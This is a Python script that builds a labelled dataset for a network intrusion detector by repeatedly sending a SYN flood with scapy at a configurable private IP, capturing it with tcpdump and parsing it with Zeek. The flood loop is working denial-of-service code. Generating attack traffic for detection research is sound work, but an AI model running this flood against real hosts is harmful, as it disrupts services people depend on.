import os
import time
import subprocess
import pandas as pd
import signal
from scapy.all import IP, TCP, send

# ========== CONFIG ==========
target_ip = "10.8.0.26"  # <-- CHANGE this to your actual IP
target_port = 80
syn_duration = 300  # seconds per SYN flood round
rounds = 10        # total number of rounds
output_file = "datasets_and_models/zeek_combined_training.csv"
# ============================

pcap_dir = "datasets_and_models/pcaps"
zeek_out_dir = "datasets_and_models/zeek_out"
os.makedirs(pcap_dir, exist_ok=True)
os.makedirs(zeek_out_dir, exist_ok=True)

# Run Zeek
def run_zeek(pcap_file, output_subdir):
    output_path = os.path.join(zeek_out_dir, output_subdir)
    os.makedirs(output_path, exist_ok=True)
    full_path = os.path.abspath(pcap_file)
    subprocess.run(["/usr/local/zeek/bin/zeek", "-r", full_path], cwd=output_path, check=True)
    return os.path.join(output_path, "conn.log")

# Parse conn.log
def parse_conn_log(path):
    with open(path) as f:
        lines = f.readlines()
    field_line = next(line for line in lines if line.startswith("#fields"))
    headers = field_line.strip().split("\t")[1:]
    data_lines = [line.strip().split("\t") for line in lines if not line.startswith("#")]
    df = pd.DataFrame(data_lines, columns=headers)
    return df

# Main batch loop
for i in range(rounds):
    print(f"\n🔁 Round {i+1}/{rounds}: Simulating SYN flood...")

    # 1. Capture SYN flood
    syn_pcap = os.path.join(pcap_dir, f"syn_batch_{i}.pcap")
    tcpdump_proc = subprocess.Popen(["sudo", "tcpdump", "-i", "any", "-w", syn_pcap])
    start = time.time()
    while time.time() - start < syn_duration:
        pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
        send(pkt, verbose=0, inter=0.0005)
    tcpdump_proc.send_signal(signal.SIGINT)
    tcpdump_proc.wait()
    print(f" Captured SYN traffic (Round {i+1})")

    # 2. Zeek parse
    syn_log = run_zeek(syn_pcap, f"syn_batch_{i}")
    df_syn = parse_conn_log(syn_log)
    df_syn["Label"] = 1

    # 3. Append to CSV
    if os.path.exists(output_file):
        df_existing = pd.read_csv(output_file)
        df_final = pd.concat([df_existing, df_syn], ignore_index=True)
    else:
        df_final = df_syn

    df_final.to_csv(output_file, index=False)
    print(f" Appended to {output_file} (total rows: {len(df_final)})")

print("\n All SYN flood rounds complete! Dataset updated.")
